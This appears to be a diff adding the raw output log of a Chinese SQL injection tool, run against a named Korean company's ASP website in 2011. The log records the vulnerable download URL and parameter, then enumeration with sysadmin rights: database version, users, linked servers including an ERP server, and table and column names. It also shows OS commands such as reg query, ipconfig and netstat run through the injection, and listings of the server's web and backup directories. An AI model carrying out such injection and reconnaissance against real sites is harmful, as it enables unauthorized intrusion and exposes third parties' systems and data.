@@ -1,0 +1,543 @@
+■漏洞信息:============================================================
+ ·URL:http://www.kdr.co.kr/_bbs/dnfile.asp?board=sdata&seq=2573&fileseq=1
+ ·页面标题：
+ ·参数:board=sdata&seq=2573&fileseq=1
+ ·方法:GET
+ ·类型:Numeric
+ ·利用方法:And
+ ·脚本语言:asp
+ ·IP:221.132.89.130
+ ·数据库:SQL Server
+ ·HEAD:
+HTTP/1.1 200 OK
+Connection: close
+Date: Mon, 04 Apr 2011 08:35:50 GMT
+Server: Microsoft-IIS/6.0
+X-Powered-By: ASP.NET
+Content-Disposition: attachment;filename=taqman miRNA assay.pdf
+Content-Length: 1272153
+Content-Type: text/html
+Expires: Mon, 04 Apr 2011 08:34:50 GMT
+Set-Cookie: ASPSESSIONIDCCATSCQS=GCCPGMHAIGHKIIPHBMHLJBOI; path=/
+Cache-control: 0
+
+
+
+■数据库信息:============================================================
+首关键字:varchar 蔼 '
+尾关键字:'阑(甫) 
+
+- 数据库名：X_DB
+- 用户名：dbo
+- 版本：Microsoft SQL Server 2005 - 9.00.2047.00 (Intel X86) 
+	Apr 14 2006 01:12:25 
+	Copyright (c) 1988-2005 Microsoft Corporation
+	Standard Edition on Windows NT 5.2 (Build 3790: Service Pack 2)
+
+- 服务器名：WEBSERVER
+- 服务名：MSSQLSERVER
+- 系统用户名：kdrsk
+
+■发现SQL2005，建议您先切换到 '杂项工具' 标签页面开启相关设置。
+ ·当前用户权限：
+sysadmin(sa): 1
+dbcreator): 1
+bulkadmin: 1
+diskadmin: 1
+serveradmin: 1
+public: 1
+db_owner: 1
+db_backupoperator: 1
+db_datawriter: 1
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+master	D:\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\master.mdf	
+tempdb	D:\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\tempdb.mdf	
+model	D:\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\model.mdf	
+msdb	D:\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\MSDBData.mdf	
+X_DB	D:\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\X_DB.mdf	
+
+ ·SQL Server用户名列表：
+用户名		角色		安全编号
+----------------------------------------------------------------------------------------------------
+public		?..?.???????慃	04  8 2003  9:10AM	
+dbo			04  8 2003  9:10AM	
+guest		.	04  8 2003  9:10AM	
+##MS_AgentSigningCertificate##		?..?.?粋?劎????庇?	02 24 2011  5:28PM	
+WEBSERVER\SQLServer2005MSFTEUser$WEBSERVER$MSSQLSERVER		?..?.???粶???.	02 24 2011  3:21PM	
+db_owner		?..?.......?.	04  8 2003  9:10AM	
+db_accessadmin		?..?.......?.	04  8 2003  9:10AM	
+db_securityadmin		?..?.......?.	04  8 2003  9:10AM	
+db_ddladmin		?..?.......?.	04  8 2003  9:10AM	
+db_backupoperator		?..?.......?.	04  8 2003  9:10AM	
+db_datareader		?..?.......?.	04  8 2003  9:10AM	
+db_datawriter		?..?.......?.	04  8 2003  9:10AM	
+db_denydatareader		?..?.......?.	04  8 2003  9:10AM	
+db_denydatawriter		?..?.......?.	04  8 2003  9:10AM	
+
+ ·数据库相关进程信息:
+程序名	状态	主机名	主机进程ID	命令行	NT用户名
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+	background			RESOURCE MONITOR		
+Internet Information Services	sleeping	WEBSERVER	2056	AWAITING COMMAND		
+Internet Information Services	sleeping	WEBSERVER	2056	AWAITING COMMAND		
+Internet Information Services	sleeping	WEBSERVER	2056	AWAITING COMMAND		
+Internet Information Services	sleeping	WEBSERVER	2056	AWAITING COMMAND		
+
+ ·链接的服务器信息:
+服务器名	服务器产品	提供者名	数据源	位置	服务器网络名
+----------------------------------------------------------------------------------------------------
+WEBSERVER	SQL Server	SQLOLEDB	WEBSERVER		WEBSERVER	
+ERPSERVER	SQL Server	SQLOLEDB	ERPSERVER		ERPSERVER	
+
+ ·数据库用户登录信息：
+用户名	密码HASH	数据库编号	语言	时间1	时间2
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+■reg query "HKLM\SYSTEM\ControlSet001\Services\W3SVC\Parameters\Virtual Roots" /V "/"
+1	坷幅: 坷幅: 矫胶袍捞 瘤沥等 饭瘤胶飘府 虐 肚绰 蔼阑 茫阑 荐 绝嚼聪促.	
+2		
+■ipconfig
+1		
+2	Windows IP Configuration	
+3		
+4		
+5	PPP adapter RAS Server (Dial In) Interface:	
+6		
+7	   Connection-specific DNS Suffix  . : 	
+8	   IP Address. . . . . . . . . . . . : 10.0.0.1	
+9	   Subnet Mask . . . . . . . . . . . : 255.255.255.255	
+10	   Default Gateway . . . . . . . . . : 	
+11		
+12	Ethernet adapter 肺拿 康开 楷搬:	
+13		
+14	   Connection-specific DNS Suffix  . : 	
+15	   IP Address. . . . . . . . . . . . : 192.168.10.20	
+16	   Subnet Mask . . . . . . . . . . . : 255.255.255.0	
+17	   Default Gateway . . . . . . . . . : 192.168.10.1	
+18		
+Dir of C:: 
+
+Documents and Settings\
+Inetpub\
+Program Files\
+RECYCLER\
+System Volume Information\
+WINDOWS\
+wmpub\
+AUTOEXEC.BAT
+CONFIG.SYS
+hInstall.log
+hpcsvc.log
+hVrmonnt.log
+msizap.exe
+VIRTPART.DAT
+
+Dir of C:\wmpub: 
+
+wmiislog\
+
+Dir of C:\wmpub\wmiislog: 
+
+
+Dir of D:: 
+
+[Win2k汗盔矫]Microsoft SQL Server\
+Ghost_backup\
+kdr_new\
+kdr2006\
+Microsoft SQL Server\
+RECYCLER\
+System Volume Information\
+Temp\
+WEB_Backup\
+DELTREE.EXE
+Noname1.txt
+NT Login.exe
+Web Backup.bat
+
+Dir of D:\WEB_Backup: 
+
+DB_Backup\
+kdr_new\
+kdr2006_temp\
+kdr2006\
+
+Dir of D:\WEB_Backup\kdr_new: 
+
+蜡侩茄 胶农赋飘\
+祈瘤瘤\
+Board\
+Company_info\
+Daumone\
+English_web\
+etc_img\
+Event_img\
+include\
+Intranet\
+Journal\
+Login\
+Main_img\
+MainPage_Photo\
+mkjohn\
+New_Product\
+Order\
+Popup\
+Product_info\
+Product_View\
+Temp\
+Util\
+web_diary\
+Bottom.asp
+default.asp
+default_logout.asp
+global.asa
+Left_Menu.asp
+Main.asp
+Main_picture.htm
+Main_Sample.asp
+news.asp
+news_body.asp
+news_e.htm
+news_t.htm
+notice.asp
+notice_body.asp
+notice_e.htm
+notice_t.htm
+Product_Scroll.html
+Product_Scroll_2.html
+Sample.asp
+Top_Login.asp
+Top_Logout.asp
+
+Dir of D:\kdr_new: 
+
+蜡侩茄 胶农赋飘\
+祈瘤瘤\
+Board\
+Company_info\
+Daumone\
+English_web\
+etc_img\
+Event_img\
+include\
+Intranet\
+Journal\
+Login\
+Main_img\
+MainPage_Photo\
+New_Product\
+Order\
+Popup\
+Product_info\
+Product_View\
+Temp\
+Util\
+web_diary\
+Bottom.asp
+default.asp
+default_logout.asp
+global.asa
+Left_Menu.asp
+Main.asp
+Main_picture.htm
+Main_Sample.asp
+news.asp
+news_body.asp
+news_e.htm
+news_t.htm
+Noname1.txt
+notice.asp
+notice_body.asp
+notice_e.htm
+notice_t.htm
+Product_Scroll.html
+Product_Scroll_2.html
+Sample.asp
+Top_Login.asp
+Top_Logout.asp
+
+Dir of D:\kdr2006: 
+
+_bbs\
+_css\
+_event\
+_FCKeditor\
+_img\
+_inc\
+_js\
+_lib\
+_upload\
+_viewer\
+_ximin_\
+_zipfinder\
+祈瘤瘤\
+bric_img\
+company\
+css\
+customer\
+Daumone\
+English_web\
+etc_img\
+etc\
+img\
+inc\
+include\
+intranet\
+js\
+kdr_center\
+log\
+main\
+Necrox\
+online\
+product_ab\
+product\
+SiteGallexy\
+skill\
+swf\
+Temp\
+叼滚弊规过.txt
+汲摹矫秦具且巴.txt
+举裹府胶飘捞固瘤.txt
+昆技记包访.txt
+橇饭哩抛捞记1.pdf
+global.asa
+index.html
+readme.html
+
+■正在获取文件属性：
+文件名:D:\kdr2006\web.asp
+
+
+■数据库信息:============================================================
+首关键字:varchar 蔼 '
+尾关键字:'阑(甫) 
+
+- 数据库名：X_DB
+- 用户名：dbo
+- 版本：Microsoft SQL Server 2005 - 9.00.2047.00 (Intel X86) 
+	Apr 14 2006 01:12:25 
+	Copyright (c) 1988-2005 Microsoft Corporation
+	Standard Edition on Windows NT 5.2 (Build 3790: Service Pack 2)
+
+- 服务器名：WEBSERVER
+- 服务名：MSSQLSERVER
+- 系统用户名：kdrsk
+
+■发现SQL2005，建议您先切换到 '杂项工具' 标签页面开启相关设置。
+ ·当前用户权限：
+sysadmin(sa): 1
+dbcreator): 1
+bulkadmin: 1
+diskadmin: 1
+serveradmin: 1
+public: 1
+db_owner: 1
+db_backupoperator: 1
+db_datawriter: 1
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+master	D:\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\master.mdf	
+tempdb	D:\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\tempdb.mdf	
+model	D:\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\model.mdf	
+msdb	D:\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\MSDBData.mdf	
+X_DB	D:\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\X_DB.mdf	
+
+ ·SQL Server用户名列表：
+用户名		角色		安全编号
+----------------------------------------------------------------------------------------------------
+public		?..?.???????慃	04  8 2003  9:10AM	
+dbo			04  8 2003  9:10AM	
+guest		.	04  8 2003  9:10AM	
+##MS_AgentSigningCertificate##		?..?.?粋?劎????庇?	02 24 2011  5:28PM	
+WEBSERVER\SQLServer2005MSFTEUser$WEBSERVER$MSSQLSERVER		?..?.???粶???.	02 24 2011  3:21PM	
+db_owner		?..?.......?.	04  8 2003  9:10AM	
+db_accessadmin		?..?.......?.	04  8 2003  9:10AM	
+db_securityadmin		?..?.......?.	04  8 2003  9:10AM	
+db_ddladmin		?..?.......?.	04  8 2003  9:10AM	
+db_backupoperator		?..?.......?.	04  8 2003  9:10AM	
+db_datareader		?..?.......?.	04  8 2003  9:10AM	
+db_datawriter		?..?.......?.	04  8 2003  9:10AM	
+db_denydatareader		?..?.......?.	04  8 2003  9:10AM	
+db_denydatawriter		?..?.......?.	04  8 2003  9:10AM	
+
+ ·数据库相关进程信息:
+程序名	状态	主机名	主机进程ID	命令行	NT用户名
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+	background			RESOURCE MONITOR		
+Internet Information Services	sleeping	WEBSERVER	3276	AWAITING COMMAND		
+Internet Information Services	sleeping	WEBSERVER	3276	AWAITING COMMAND		
+Internet Information Services	sleeping	WEBSERVER	3276	AWAITING COMMAND		
+Internet Information Services	sleeping	WEBSERVER	3276	AWAITING COMMAND		
+
+ ·链接的服务器信息:
+服务器名	服务器产品	提供者名	数据源	位置	服务器网络名
+----------------------------------------------------------------------------------------------------
+WEBSERVER	SQL Server	SQLOLEDB	WEBSERVER		WEBSERVER	
+ERPSERVER	SQL Server	SQLOLEDB	ERPSERVER		ERPSERVER	
+
+ ·数据库用户登录信息：
+用户名	密码HASH	数据库编号	语言	时间1	时间2
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+------------------------------------------------------------
+正在获取数据库 [X_DB] 的表名……
+ cus_mains
+dtproperties
+bbs_configs
+bas_user_levels
+sysc
+t_t
+Calendar2000
+calendar_tot
+D99_CMD
+tcb02_con
+tcb02_rea
+tcb02_app
+tst02_point
+Tcb02_cat2
+Tcb02_cat1
+Tcb02_custom
+Tcb02_desc
+bbs_tblu_def
+Tbl_brand
+cus_carts
+Tbl_order_pri
+Tbl_order_dau
+Tbl_claim
+JCZ3Tmp
+cus_events
+syscommand
+Tcb02
+bbs_club_categorys
+Tbl_order_necrox
+bbs_config_types
+Tcb01
+bbs_clubs
+bbs_config_skins
+t_jiaozhu
+bbs_categorys
+tcb02_event
+bas_configs
+Tbl_order_web_2007
+bas_counts
+bas_events
+media
+bas_zipcode
+bbs_config_layouts
+tcb02_erp
+bbs_config_tables
+a_event
+Tbl_diary
+bas_sessions
+bbs_tblf_def
+bas_menus
+comd_list
+Tbl_order_web
+bbs_tblm_def
+D99_Tmp
+jiaozhu
+
+------------------------------------------------------------
+正在获取 [X_DB].[cus_mains] 的列名……
+ seq
+main_gubn
+main_link
+main_image
+main_text
+useable
+ordered
+regdate
+
+------------------------------------------------------------
+正在获取 [X_DB].[media] 的列名……
+ item_code
+agcy
+CB
+
+
+■数据库信息:============================================================
+首关键字:varchar 蔼 '
+尾关键字:'阑(甫) 
+
+- 数据库名：X_DB
+- 用户名：dbo
+- 版本：Microsoft SQL Server 2005 - 9.00.2047.00 (Intel X86) 
+	Apr 14 2006 01:12:25 
+	Copyright (c) 1988-2005 Microsoft Corporation
+	Standard Edition on Windows NT 5.2 (Build 3790: Service Pack 2)
+
+- 服务器名：WEBSERVER
+- 服务名：MSSQLSERVER
+- 系统用户名：kdrsk
+
+■发现SQL2005，建议您先切换到 '杂项工具' 标签页面开启相关设置。
+ ·当前用户权限：
+sysadmin(sa): 1
+dbcreator): 1
+bulkadmin: 1
+diskadmin: 1
+serveradmin: 1
+public: 1
+db_owner: 1
+db_backupoperator: 1
+db_datawriter: 1
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+master	D:\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\master.mdf	
+tempdb	D:\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\tempdb.mdf	
+model	D:\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\model.mdf	
+msdb	D:\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\MSDBData.mdf	
+X_DB	D:\Microsoft SQL Server\MSSQL.1\MSSQL\DATA\X_DB.mdf	
+
+ ·SQL Server用户名列表：
+用户名		角色		安全编号
+----------------------------------------------------------------------------------------------------
+public		?..?.???????慃	04  8 2003  9:10AM	
+dbo			04  8 2003  9:10AM	
+guest		.	04  8 2003  9:10AM	
+##MS_AgentSigningCertificate##		?..?.?粋?劎????庇?	02 24 2011  5:28PM	
+WEBSERVER\SQLServer2005MSFTEUser$WEBSERVER$MSSQLSERVER		?..?.???粶???.	02 24 2011  3:21PM	
+db_owner		?..?.......?.	04  8 2003  9:10AM	
+db_accessadmin		?..?.......?.	04  8 2003  9:10AM	
+db_securityadmin		?..?.......?.	04  8 2003  9:10AM	
+db_ddladmin		?..?.......?.	04  8 2003  9:10AM	
+db_backupoperator		?..?.......?.	04  8 2003  9:10AM	
+db_datareader		?..?.......?.	04  8 2003  9:10AM	
+db_datawriter		?..?.......?.	04  8 2003  9:10AM	
+db_denydatareader		?..?.......?.	04  8 2003  9:10AM	
+db_denydatawriter		?..?.......?.	04  8 2003  9:10AM	
+
+ ·数据库相关进程信息:
+程序名	状态	主机名	主机进程ID	命令行	NT用户名
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+	background			RESOURCE MONITOR		
+SQLAgent - Generic Refresher	sleeping	WEBSERVER	2196	AWAITING COMMAND	mssql	
+SQLAgent - Generic Refresher	sleeping	WEBSERVER	2196	AWAITING COMMAND	mssql	
+SQLAgent - Generic Refresher	sleeping	WEBSERVER	2196	AWAITING COMMAND	mssql	
+SQLAgent - Generic Refresher	sleeping	WEBSERVER	2196	AWAITING COMMAND	mssql	
+
+ ·链接的服务器信息:
+服务器名	服务器产品	提供者名	数据源	位置	服务器网络名
+----------------------------------------------------------------------------------------------------
+WEBSERVER	SQL Server	SQLOLEDB	WEBSERVER		WEBSERVER	
+ERPSERVER	SQL Server	SQLOLEDB	ERPSERVER		ERPSERVER	
+
+ ·数据库用户登录信息：
+用户名	密码HASH	数据库编号	语言	时间1	时间2
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+■reg query "HKLM\SYSTEM\ControlSet001\Services\W3SVC\Parameters\Virtual Roots" /V "/"
+■netstat -an
